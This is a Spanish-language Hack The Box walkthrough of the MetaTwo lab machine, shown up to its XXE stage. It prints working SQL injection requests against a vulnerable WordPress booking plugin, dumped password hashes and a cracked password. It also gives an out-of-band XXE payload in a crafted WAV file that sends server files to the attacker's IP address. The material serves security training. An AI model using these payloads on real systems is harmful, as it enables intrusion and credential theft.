<!doctype html><html lang="es"><head><title>MetaTwo | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un plugin vulnerable a SQLi. Con este ataque podemos obtener hashes de contraseñas y romper uno de ellos para obtener acceso al dashboard de WordPress. La versión de WordPress es vulnerable a out-of-band XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de root"><meta name="image" content="https://7rocky.github.io/images/HTB/MetaTwo/MetaTwo.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un plugin vulnerable a SQLi. Con este ataque podemos obtener hashes de contraseñas y romper uno de ellos para obtener acceso al dashboard de WordPress. La versión de WordPress es vulnerable a out-of-band XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de root"><meta itemprop="keywords" content="ftp,cve,nginx,wordpress,pgp-keys,file-upload,xxe,sqli,lfr,password-reuse,hash-cracking,"><meta itemprop="name" content="MetaTwo"><meta property="article:published_time" content="2023-04-29T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un plugin vulnerable a SQLi. Con este ataque podemos obtener hashes de contraseñas y romper uno de ellos para obtener acceso al dashboard de WordPress. La versión de WordPress es vulnerable a out-of-band XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de root"><meta property="og:image" content="https://7rocky.github.io/images/HTB/MetaTwo/MetaTwo.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="MetaTwo"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/metatwo/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un plugin vulnerable a SQLi. Con este ataque podemos obtener hashes de contraseñas y romper uno de ellos para obtener acceso al dashboard de WordPress. La versión de WordPress es vulnerable a out-of-band XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un plugin vulnerable a SQLi. Con este ataque podemos obtener hashes de contraseñas y romper uno de ellos para obtener acceso al dashboard de WordPress. La versión de WordPress es vulnerable a out-of-band XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de root"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/MetaTwo/MetaTwo.webp"><meta name="twitter:title" content="MetaTwo"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/metatwo/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/metatwo/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/metatwo/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/metatwo/&amp;text=MetaTwo" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/metatwo/&amp;title=MetaTwo" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">MetaTwo</h1><time class="mt4 f6 dib tracked" datetime="2023-04-29T00:00:00+01:00">29 / 04 / 2023</time><br><p class="mb4 f6 dib tracked">11 minutos de lectura</p></header><div class="htb-image"><img alt="MetaTwo" src="/images/HTB/MetaTwo/MetaTwo.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un <em>plugin</em> vulnerable a SQLi. Con este ataque podemos obtener <em>hashes</em> de contraseñas y romper uno de ellos para obtener acceso al <em>dashboard</em> de WordPress. La versión de WordPress es vulnerable a <em>out-of-band</em> XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de <code>root</code></div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/ftp" title="FTP">FTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/nginx" title="nginx">nginx</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/wordpress" title="WordPress">WordPress</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/pgp-keys" title="Claves PGP">Claves PGP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/xxe" title="Entidad Externa XML">Entidad Externa XML</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfr" title="Lectura de Archivos Locales">Lectura de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li><li><a href="#explotación-de-xxe">Explotación de XXE</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.186</li><li><strong>Fecha</strong>: 29 / 10 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.186 -p 21,22,80
Nmap scan report for 10.10.11.186
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-generator: WordPress 5.6.2
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MetaPress &#8211; Official company site
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 70.69 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.186</code>, se nos redirige a <code>http://metapress.htb</code>, por lo que necesitamos poner el dominio en <code>/etc/hosts</code>. Luego, veremos esta página web:</p><p><img alt="MetaTwo 2" src="/images/HTB/MetaTwo/MetaTwo-1.webp"></p><p>Parece un sitio web de WordPress. Si vamos a <code>/events/</code> tenemos esta aplicación:</p><p><img alt="MetaTwo 2" src="/images/HTB/MetaTwo/MetaTwo-2.webp"></p><p>En el código fuente, podemos observar que usa <a target="_blank" href="https://www.bookingpressplugin.com/"><code>bookingpressplugin</code></a> versión 1.0.10:</p><p><img alt="MetaTwo 3" src="/images/HTB/MetaTwo/MetaTwo-3.webp"></p><p>Buscando por esta versión, encontramos que es vulnerable a inyección de código SQL (<a target="_blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739">CVE-2022-0739</a>, más detalles en <a target="_blank" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">wpscan.com</a>).</p><p>Necesitamos tomar un valor llamado <code>nonce</code> del código fuente HTML:</p><p><img alt="MetaTwo 4" src="/images/HTB/MetaTwo/MetaTwo-4.webp"></p><p>Ahora podemos usar la prueba de concepto de <a target="_blank" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">wpscan.com</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> metapress.htb/wp-admin/admin-ajax.php -d <span class="code-dark-yellow">'action=bookingpress_front_get_category_services&_wpnonce=d7b1c25e29&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</span>
[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> metapress.htb/wp-admin/admin-ajax.php -sd <span class="code-dark-yellow">'action=bookingpress_front_get_category_services&_wpnonce=d7b1c25e29&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</span> | <span class="code-dark-green">jq</span>
<span class="code-white">[</span>
<span class="code-white">  {</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_id"</span>: <span class="code-dark-green">"10.5.15-MariaDB-0+deb11u1"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_category_id"</span>: <span class="code-dark-green">"Debian 11"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_name"</span>: <span class="code-dark-green">"debian-linux-gnu"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_price"</span>: <span class="code-dark-green">"$1.00"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_duration_val"</span>: <span class="code-dark-green">"2"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_duration_unit"</span>: <span class="code-dark-green">"3"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_description"</span>: <span class="code-dark-green">"4"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_service_position"</span>: <span class="code-dark-green">"5"</span>,</span>
<span class="code-white">    <span class="code-blue">"bookingpress_servicedate_created"</span>: <span class="code-dark-green">"6"</span>,</span>
<span class="code-white">    <span class="code-blue">"service_price_without_currency"</span>: </span>1,
<span class="code-white">    <span class="code-blue">"img_url"</span>: <span class="code-dark-green">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"</span></span>
<span class="code-white">  }</span>
<span class="code-white">]</span>
</code></pre></div><p>¡Y funciona! El servidor es vulnerable a SQLi.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Vamos a crear una función de <em>shell</em> con el comando anterior para explotar SQLi más fácilmente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> sqli<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> metapress.htb/wp-admin/admin-ajax.php -sd <span class="code-dark-yellow">"action=bookingpress_front_get_category_services&_wpnonce=d7b1c25e29&category_id=33&total_service=-7502) UNION ALL SELECT <span class="code-dark-cyan">$1</span>,2,3,4,5,6,7,8,9-- -"</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.[].bookingpress_service_id'</span> <span class="code-dark-yellow">}</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> @@version
10.5.15-MariaDB-0+deb11u1
</code></pre></div><h3 id="explotación-de-sqli">Explotación de SQLi</h3><p>Dado que el servidor usa WordPress, podemos intentar acceder a la tabla <code>wp_users</code> y seleccionar <code>user_login</code> y <code>user_pass</code> (usando <code>concat</code> para juntar ambos valores con dos puntos, que es <code>0x3a</code> en hexadecimal):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"(select count(*) from wp_users)"</span>
2

<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"(select concat(user_login,0x3a,user_pass) from wp_users limit 0,1)"</span> &gt;&gt; hashes  
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.

<span class="code-cyan">$</span> <span class="code-dark-green">sqli</span> <span class="code-dark-yellow">"(select concat(user_login,0x3a,user_pass) from wp_users limit 1,1)"</span> &gt;&gt; <span class="mtku">hashes</span>
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
</code></pre></div><p>Con esto conseguimos dos <em>hashes</em> de WordPress. Solamente el <em>hash</em> de <code>manager</code> se consigue romper con <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hashes</span>
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 ASIMD 4x2])  
Cost 1 (iteration count) is 8192 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">partylikearockstar</span> (<span class="code-dark-yellow">manager</span>)
1g 0:01:01:21 DONE 0.000271g/s 3896p/s 3926c/s 3926C/s  abrxbt..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
</code></pre></div><p>En este punto, podemos iniciar sesión como <code>manager</code>:</p><p><img alt="MetaTwo 5" src="/images/HTB/MetaTwo/MetaTwo-5.webp"></p><p><img alt="MetaTwo 6" src="/images/HTB/MetaTwo/MetaTwo-6.webp"></p><p>Ahora vemos que el servidor usa WordPress versión 5.6.2:</p><p><img alt="MetaTwo 7" src="/images/HTB/MetaTwo/MetaTwo-7.webp"></p><p>Esta versión tiene múltiples vulnerabilidades, como se muestra en <a target="_blank" href="https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/">www.acunetix.com</a>. Podemos encontrar una explicación de cómo funciona una vulnerabilidad de <em>out-of-band XML External Entity</em> (OOB XXE) en <a target="_blank" href="https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/">www.sonarsource.com</a>. También existe un <a target="_blank" href="https://github.com/motikan2010/CVE-2021-29447">repositorio de GitHub</a> con código para explotar esta vulnerabilidad (<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-29447">CVE-2021-29447</a>). El <em>exploit</em> nos permitirá leer archivos desde el servidor (<em>Local File Read</em>).</p><h3 id="explotación-de-xxe">Explotación de XXE</h3><p>Necesitamos usar un archivo DTD XML como este (insertando nuestra dirección IP):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;!</span><span class="mtk5">ENTITY</span><span class="mtk1"> % data</span><span class="mtk5"> SYSTEM</span><span class="mtk1"> </span><span class="mtk4">"php://filter/zlib.deflate/convert.base64-encode/r</span><span class="mtk4">esource=/etc/passwd"</span><span class="mtk1">&gt;</span>  
<span class="mtk1">&lt;!</span><span class="mtk5">ENTITY</span><span class="mtk1"> % param1 </span><span class="mtk4">"&lt;!ENTITY exfil SYSTEM '</span><span class="mtk1 detected-link">http://10.10.17.44:8001/?</span><span class="mtk9 detected-link">%data</span><span class="mtk9">;</span><span class="mtk4">'&gt;"</span><span class="mtk1">&gt;</span>
</code></pre></div><p>Iremos cambiando el nombre de archivo que queremos leer desde el servidor. A continuación, necesitamos crear nuestro <em>payload</em> dentro de un archivo WAV (nuevamente, con nuestra dirección IP):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -en <span class="code-dark-yellow">'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://10.10.17.44:8001/evil.dtd'"'"'&gt;%remote;%init;%trick;] &gt;\x00'</span> &gt; malicious.wav  
